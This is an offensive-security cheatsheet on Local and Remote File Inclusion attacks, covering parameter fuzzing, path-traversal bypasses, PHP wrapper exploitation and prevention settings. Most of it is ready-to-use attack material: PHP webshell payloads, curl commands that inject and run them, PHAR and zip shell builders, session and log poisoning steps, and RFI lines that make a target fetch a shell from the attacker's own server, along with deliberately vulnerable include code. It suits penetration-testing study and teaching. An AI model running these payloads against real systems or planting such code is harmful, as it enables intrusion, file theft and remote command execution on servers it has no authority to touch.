# Local File Inclusion (LFI) Cheatsheet

---

# 1. Discovery

## Understanding LFI Vulnerabilities
File Inclusion vulnerabilities occur when web applications dynamically load files based on user-controlled input without proper sanitization. This can happen in many frameworks like `PHP`, `NodeJS`, `Java`, `.Net`.

### Vulnerable Functions by Framework

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |

---

## Parameter Fuzzing

### Discovering Vulnerable Parameters
```shell
# Common LFI parameter wordlist
/usr/share/seclist/Fuzzing/LFI/hackTricks-top-25-params

# Fuzz for parameters
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

### LFI Path Fuzzing
```shell
# Jhaddix LFI wordlist
seclist/Fuzzing/LFI/Jhaddix

# Fuzz for LFI payloads
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

---

## Fuzzing for Server Files

### Server Webroot Discovery
Useful when you need the full path to locate uploaded files.

**Linux webroot paths:**
```
var/www/html/
var/www/
var/www/sites/
var/www/public/
var/www/public_html/
var/www/html/default/
srv/www/
srv/www/html/
srv/www/sites/
home/www/
home/httpd/
home/$USER/public_html/
home/$USER/www/
```

**Windows webroot paths:**
```
c:\inetpub\wwwroot\
c:\xampp\htdocs\
c:\wamp\www
```

Wordlists:
- [Linux webroot wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
- [Windows webroot wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)

### Server Logs & Config Files

After finding the vulnerable parameter and traversing to root (`/`), fuzz for sensitive files:

```shell
# Linux logs/configs
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

# Wordlists
/tools/logs_lfi_windows.txt    # Windows
/tools/my-resources/logs_lfi_linux.txt   # Linux
```

**Key files to check:**
```
/etc/passwd | grep sh$        # Find active users
/etc/nginx/sites-enabled/default   # Check for vhosts
/proc/self/cmdline            # Check user running the server
```

---

## Web Application Page Discovery

```shell
# Fuzz for all PHP pages (not just 200 OK - include 301, 302, 403)
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

# Example output:
# index    [Status: 200, Size: 2652]
# config   [Status: 302, Size: 0]
```

---

# 2. Test Cases & Exploitation

## Basic LFI Test

### Path Traversal
```
# Linux
../../../../etc/passwd

# Windows
..\..\..\..\Windows\boot.ini
```

### Directory Traversal with Different Encodings

**Double dots encoded:**
- `..` (ASCII 46) = `%2E%2E`
- `/` (ASCII 47) = `%2F`

```
# Basic traversal
....//....//....//...//etc/passwd

# URL encoded
%2E%2E%2F

# Full path URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

---

## Bypass Techniques

### Approved Path Bypass
When web apps restrict to specific directories (e.g., `./languages`):
```
<server>/index.php?language=./languages/../../../../etc/passwd
```

### Filename Prefix Bypass
If input is prefixed (e.g., `lang_`), add `/` before payload:
```
/index.php?language=/....//....//etc/passwd
```

### Null Byte Injection (PHP < 5.5)
Terminates string to bypass appended extensions:
```
/etc/passwd%00
# Final path becomes /etc/passwd%00.php → /etc/passwd
```

### Path Truncation (PHP < 5.3/5.4)
PHP strings have max 4096 characters. Exceed limit to truncate `.php` extension:
```url
?language=non_existing_directory/../../../etc/passwd/./././././ [REPEATED ~2048 times]
```

---

## PHP Wrappers & Filters

### PHP Filter (Source Code Disclosure)
Read PHP source code as base64 instead of executing:

```
php://filter/read=convert.base64-encode/resource=config

# Full URL
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

**Why use this?** Config files like `config.php` execute silently and don't output HTML. Base64 encoding reveals the source code.

### Practical Source Code Reading Strategy
1. **Fuzz for all pages**: `200 OK`, `301`, `302`, `403`
2. **Start with `index.php`**: Read using base64 filter
3. **Extract internal references**: Look for `include()`, `require()`, etc.
4. **Recursively read included files** using `php://filter`
5. **Build a full picture** of the application

---

## PHP Wrappers for RCE

### Check if Wrappers are Enabled
```shell
# Read PHP config
<VULN-PARAM>=php://filter/read=convert.base64-encode/resource=../../../../etc/php/<7.4 or fuzz>/apache2/php.ini"

# Decode and check
echo '<b64 output>' | base64 -d | grep allow_url_include
```

### Data Wrapper RCE
Requires `allow_url_include = On`

```shell
# Create webshell payload
echo '<?php system($_GET["cmd"]); ?>' | base64 -w 0
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# Execute via URL
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

# Using curl
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

### Input Wrapper RCE
Requires `allow_url_include = On`

```shell
# GET parameter accepts GET
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

# POST-only parameter
curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input" | grep uid
```

### Expect Wrapper RCE
Requires `extension=expect` in php.ini

```shell
# Check if enabled
echo '<base64 php.ini>' | base64 -d | grep expect

# Execute command
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

---

## File Upload + LFI Attacks

### Malicious Image Upload
```shell
# Create malicious GIF with PHP webshell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Upload the file, then find its path in source code:
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Execute via LFI:
```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

### Zip Upload Attack
Requires `zip` wrapper enabled.

```shell
# Create zip with shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Execute via LFI:
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### PHAR Upload Attack
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

Compile and rename:
```shell
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Execute via LFI:
```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

---

## Log Poisoning

### PHP Session Poisoning
Session files stored at:
- **Linux:** `/var/lib/php/sessions/sess_<PHPSESSID>`
- **Windows:** `C:\Windows\Temp\`

**Steps:**
1. Get session cookie value from browser
2. Test if parameter is reflected:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
   ```
3. Check session file:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<cookie_value>
   ```
4. Inject webshell:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
   ```
5. Execute:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<cookie_value>&cmd=id
   ```

### Web Server Log Poisoning

**Log locations:**
- Apache: `/var/log/apache2/access.log`
- Nginx: `/var/log/nginx/access.log`

**Note:** Nginx logs readable by `www-data`, Apache logs require root/adm by default.

```shell
# Poison User-Agent header
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison

# Execute via LFI
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

**Other poisonable logs:**
- `/var/log/sshd.log` - poison with username
- `/var/log/mail` - poison via email
- `/var/log/vsftpd.log` - poison with FTP username
- `/proc/self/environ` - User-Agent in process files
- `/proc/self/fd/N` (N = 0-50 PID)

---

## Remote File Inclusion (RFI)

### Verify RFI Capability

**Method 1 - Include local URL:**
```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/existingpage.php
```

**Method 2 - Check PHP config:**
```shell
echo '<BASE64-CONFIG>' | base64 -d | grep allow_url_include
# allow_url_include = On
```

### RCE via HTTP
```shell
# Create shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Start listener
sudo python3 -m http.server 8000

# Include remote shell
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:8000/shell.php&cmd=id
```

### RCE via FTP
Useful when HTTP is blocked by firewall/WAF:
```shell
# Start FTP server
sudo python -m pyftpdlib -p 21

# Include via FTP
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

# With credentials
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

### RCE via SMB (Windows targets)
Does NOT require `allow_url_include`:
```shell
# Start SMB server
impacket-smbserver -smb2support share $(pwd)

# Include via UNC path
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

---

## Second-Order Attacks

Poisoning database entries to trigger LFI indirectly:

**Example:** Malicious username like `../../../etc/passwd`, later used in avatar path:
```
/profile/$username/avatar.png → /profile/../../../etc/passwd/avatar.png
```

Developers often trust database values more than direct user input.

---

## Vulnerable Code Examples

### PHP
```php
// Vulnerable
if (isset($_GET['language'])) {
    include($_GET['language']);
}

// With directory prefix
include("./languages/" . $_GET['language']);

// With extension appended
include($_GET['language'] . ".php");
```

### NodeJS
```javascript
// fs.readFile
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}

// res.render
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

### .NET
```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}

@Html.Partial(HttpContext.Request.Query['language'])

<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

---

# 3. Prevention

## Input Validation & Sanitization
- **Never pass user-controlled input** directly to file inclusion functions
- Dynamically load assets on the back-end without user interaction
- Validate inputs against a strict whitelist of allowed values

## Prevent Directory Traversal
Attackers with directory control can:
- Read `/etc/passwd` for SSH keys and usernames
- Access service configs like `tomcat-users.xml`
- Hijack PHP sessions
- Read application source code and configuration

## Web Server Configuration

### PHP Configuration (`php.ini`)
```ini
# Disable remote file inclusion
allow_url_fopen = Off
allow_url_include = Off

# Restrict to web directory
open_basedir = /var/www

# Disable dangerous modules
; extension=expect
```

### Containerization
Run applications within **Docker** to isolate filesystem access.

### Disable Dangerous Modules
- [PHP Expect](https://www.php.net/manual/en/wrappers.expect.php)
- [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html)

## Web Application Firewall (WAF)
- Use **ModSecurity** or similar WAF
- Start with **permissive mode** to avoid false positives
- Use as early warning system for attacks
- Average detection time without proper hardening: **30 days** (FireEye M-Trends 2020)

---

## References
- [HackTricks LFI Guide](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)
- [OWASP RFI Testing Guide](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)
- [LFI2RCE via phpinfo](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)